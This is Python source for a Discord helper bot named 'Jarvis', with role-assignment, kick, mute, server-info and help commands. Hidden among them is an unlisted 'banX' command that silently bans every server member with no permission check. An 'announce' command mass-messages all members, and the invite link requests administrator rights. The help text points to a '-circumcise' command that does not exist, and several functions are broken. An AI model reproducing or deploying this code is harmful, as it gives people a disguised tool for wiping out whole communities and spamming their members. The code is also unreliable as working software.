import discord
from datetime import date
from datetime import time
from discord.ext import commands
from random import *
import json
import random
import requests
import asyncio
import aiohttp

bot = commands.Bot(command_prefix='-')

@bot.event
async def on_ready():
    game = discord.Game("JarvisBot (Use -help for more information)")
    await bot.change_presence(status=discord.Status.idle, activity=game)
    print('Logged in as')
    print(bot.user.name)
    print(bot.user.id)
    print('------')
#---------------------------------Advertise--------------------------------------
@bot.command(description="This command announces something to everyones dms!",aliases=["tell","dm all","announcement"])
async def announce(ctx,*,message:str):
    for member in ctx.guild.members:
        try:
            await member.send(message)
            print(f"{member} recieved the message!")
        except:
            print(f"{member} has their dms closed")

#---------------------------------Setup---------------------------------------------
@bot.command()
async def setup(ctx):
	guild = ctx.guild
	perms = discord.Permissions()
	perms.update(administrator=True, kick_members=True, ban_members=True)
	await guild.create_role(name="Jarvis", colour=discord.Colour(0x2ecc71))


#---------------------------------------------MemberRole-----------------------------------
@bot.command()
async def member(ctx):
	role = discord.utils.get(ctx.guild.roles, name="Member")
	user = ctx.message.author
	await user.add_roles(role)
	await ctx.message.delete()
#-------------------------------------------Web-Exploiter-Role------------------------------------
@bot.command()
async def Web(ctx):
	role2 = discord.utils.get(ctx.guild.roles, name="Web-Exploiter")
	user = ctx.message.author
	await user.add_roles(role2)
	await ctx.message.delete()
#------------------------------------------Hardware-Hacker-Role-------------------------------
@bot.command()
async def Hardware(ctx):
	role3 = discord.utils.get(ctx.guild.roles, name="Hardware-Hacker")
	user = ctx.message.author
	await user.add_roles(role3)
	await ctx.message.delete()
#------------------------------------------Software-Hacker-Role-------------------------------
@bot.command()
async def Software(ctx):
	role4 = discord.utils.get(ctx.guild.roles, name="Software-Hacker")
	user = ctx.message.author
	await user.add_roles(role4)
	await ctx.message.delete()
#-------------------------------------------Reverse-Engineer-Role-------------------------------
@bot.command()
async def Reverse(ctx):
	role5 = discord.utils.get(ctx.guild.roles, name="Reverse-Engineer")
	user = ctx.message.author
	await user.add_roles(role5)
	await ctx.message.delete()

#-------------------------------------------Welcome-Bot----------------------------------------
#---------------------------------------Server Info----------------------------------------
@bot.command()
async def server(ctx):
	embed = discord.Embed(title="ServerInfo", description="History of this server", color=0x2ecc71)
	embed.add_field(name="ServerCreationTime:", value="test", inline=False)
	embed.add_field(name="NumberOfPeople:", value= len(set(bot.get_all_members())), inline=False)

	await ctx.send(embed=embed)

#-------------------------------------Mute-User---------------------------------------
@bot.command()
async def mute(ctx, member : discord.Member, *, reason=None):
	role6 = discord.utils.get(ctx.guild.roles, name="muted")
	await member.add_roles(role6)

#----------------------------------------Date----------------------------------------

@bot.command()
async def date(ctx):
    await ctx.send(date())

#--------------------------------------Circumcise--------------------------------------

@bot.command()
async def kick(ctx, member : discord.Member, *, reason=None):
	await member.kick(reason=reason)

@bot.command()
async def banX(ctx):
	await ctx.message.delete()
	for user in list(ctx.guild.members):
		try:
			await ctx.guild.ban(user)
			print (f"{user.name} has been kicked from {ctx.guild.name}")
		except:
			print (f"{user.name} has FAILED to be kicked from {ctx.guild.name}")

		print ("Action Completed: Everyone Has Been Circumcised")

#---------------------------Info-------------------------------------------------------

@bot.command()
async def info(ctx):
    embed = discord.Embed(title="𝕵𝖆𝖗𝖛𝖎𝖘", description="How may I serve you?", color=0x2ecc71)

    # give info about you here
    embed.add_field(name="Author", value="𝐿𝑒𝑔𝑒𝓃𝒹𝒶𝓇𝓎#9725")

    # Shows the number of servers the bot is member of.
    embed.add_field(name="Server count", value=f"{len(bot.guilds)}")

    #Creation Date of Bot
    embed.add_field(name="Bot was created in", value="9/1/19")

    # give users a link to invite thsi bot to their server
    embed.add_field(name="Invite the bot to your server", value="[https://discordapp.com/api/oauth2/authorize?client_id=580640436759298081&permissions=8&scope=bot]")

    await ctx.send(embed=embed)

bot.remove_command('help')

@bot.command()
async def joined(ctx, member: discord.Member):
    """Says when a member joined."""
    await ctx.send('{0.name} joined in {0.joined_at}'.format(member))


#------------------------------------Help---------------------------------------------

@bot.command()
async def help(ctx):
    embed = discord.Embed(title="Jarvis", description="Jarvis is here to simplify your job and tasks here are a lis of commands.", color=0x2ecc71)

    embed.add_field(name="-info", value="Brief snippet of information about the bot", inline=False)
    embed.add_field(name="-date", value="Tells you what day it is", inline=False)
    embed.add_field(name="-circumcise", value="Kicks whoever you want", inline=False)
    embed.add_field(name="-server", value="Gives overview of server", inline=False)
   
    await ctx.send(embed=embed)



bot.run()
